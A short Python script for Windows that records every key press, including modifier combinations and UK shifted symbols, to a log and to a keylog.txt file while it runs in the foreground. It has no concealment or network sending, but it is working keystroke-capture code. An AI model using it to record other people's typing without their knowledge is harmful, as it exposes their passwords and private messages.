import logging
import string
from pathlib import Path
import win32api

from pynput.keyboard import Key, KeyCode, Listener

LOGFILE = Path(__file__).parent / "keylog.txt"

_SYMBOLS_UNSHIFTED = r"""`1234567890-=[]\;',./"""
_SYMBOLS_SHIFTED   = r"""¬!"£$%^&*()_+{}|:@<>?"""
SHIFT_MAP_GB = dict(zip(string.ascii_lowercase, string.ascii_uppercase)) | dict(zip(_SYMBOLS_UNSHIFTED, _SYMBOLS_SHIFTED))

logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s.%(msecs)03d : %(levelname)-5s : %(message)s',
    datefmt='%Y-%m-%d %H:%M:%S'
)

VK_SHIFT = 0x10
VK_CTRL = 0x11
VK_ALT = 0x12
VK_CMD = 0x5B
VK_CAPS = 0x14

MODIFIER_KEYS = {
    Key.shift.name: VK_SHIFT,
    Key.ctrl.name: VK_CTRL,
    Key.alt.name: VK_ALT,
    Key.cmd.name: VK_CMD,
}


def main():
    def normalize(key):
        k = listener.canonical(key)
        if isinstance(k, KeyCode) and k.char is None:
            k = key
        if isinstance(k, Key):
            return k.name
        else:
            return k.char
    
    with Listener(
        on_press=(lambda key: record(normalize(key))),
        on_release=(lambda _: None),
    ) as listener:
        input()


def record(key: str):
    if key in MODIFIER_KEYS:
        return
    modifiers_down = set()
    for mod, vk in MODIFIER_KEYS.items():
        if win32api.GetKeyState(vk) < 0:
            modifiers_down.add(mod)
    if key in string.ascii_lowercase and win32api.GetKeyState(VK_CAPS) == 1:
        modifiers_down.add(Key.caps_lock.name)
    if modifiers_down == {Key.shift.name} and key in SHIFT_MAP_GB:
        entry = SHIFT_MAP_GB[key]
    else:
        combo = sorted(modifiers_down) + [key]
        entry = ' + '.join(combo)
    logging.info(f'key: {entry}')
    with LOGFILE.open("a") as f:
        f.write(f"{entry}\n")


if __name__ == '__main__':
    main()
